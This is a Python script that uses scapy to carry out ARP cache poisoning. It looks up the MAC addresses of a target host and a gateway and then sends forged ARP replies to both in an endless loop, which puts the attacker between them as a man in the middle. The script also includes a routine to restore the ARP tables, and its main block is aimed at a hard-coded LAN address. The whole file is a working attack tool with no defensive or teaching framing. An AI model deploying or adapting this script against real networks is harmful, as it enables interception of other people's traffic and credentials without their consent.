from scapy.all import *
from multiprocessing import Process
from colorama import init, Fore
import logging

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

class Error(Exception):
    pass

class ARPPoison():
    def __init__(self,target,gateway,verbose=1):
        self.gateway = gateway
        self.target  = target

        self.t_mac   = self.get_mac_address(target)
        self.g_mac   = self.get_mac_address(gateway)
        if not self.t_mac or not self.g_mac: logging.critical("Error getting mac addresses");raise Error("Error getting mac addresses")

        init()
        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
        logging.addLevelName(logging.DEBUG, f"[{cyan}**{reset}]")
        logging.basicConfig(format="%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.WARNING)

    def get_mac_address(self,t_ip : str):
        try:
            arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=t_ip)
            ans, uns      = srp(arp_broadcast, timeout=2,verbose=0)

            return ans[0][1][1].hwsrc
        except:
            return None

    def poison_arp(self,t_ip:str, t_mac:str, g_ip:str):
        try:
            arp_spoof = ARP(op=2, psrc=g_ip, pdst=t_ip, hwdst=t_mac)
            send(arp_spoof,verbose=0)
        except:
            logging.error(f"Error trying to poison ARP from {t_ip}")

    def restore_arp(self,t_ip:str, t_mac:str, s_ip, s_mac):
        try:
            pkt = ARP(op=2, hwsrc=s_mac, psrc=s_ip, pdst=t_ip, hwdst=t_mac)
            send(pkt,verbose=0)
            logging.info(f"{t_ip} ARP restored")
        except:
            logging.error(f"Error trying to restore ARP from {t_ip}")

    def start(self):
        try:
            self.main_thread = Process(target=self.main)
            self.main_thread.start()
        except:
            logging.critical("An error ocurred trying to start main thread")
            raise Error("An error ocurred trying to start main thread")

    def stop(self):
        try:
            self.main_thread.kill()
        except:
            logging.critical("An error ocurred trying to kill main thread")
            raise Error("An error ocurred trying to kill main thread")

        self.restore_arp(self.gateway,self.g_mac, self.target,self.t_mac)
        self.restore_arp(self.target,self.t_mac, self.gateway,self.g_mac)

    def main(self):
        logging.info(f"Target MAC: {self.t_mac}")
        logging.info(f"Gateway MAC: {self.g_mac}")

        try:
            while True:
                self.poison_arp(self.target,self.t_mac,self.gateway)
                self.poison_arp(self.gateway,self.g_mac,self.target)
        except KeyboardInterrupt:
            logging.debug("ARP spoof stoped")

if __name__ == "__main__":
    arppoison = ARPPoison("192.168.1.106","192.168.1.1")
    try:
        arppoison.start()
        arppoison.main_thread.join()
    except KeyboardInterrupt:
        arppoison.stop()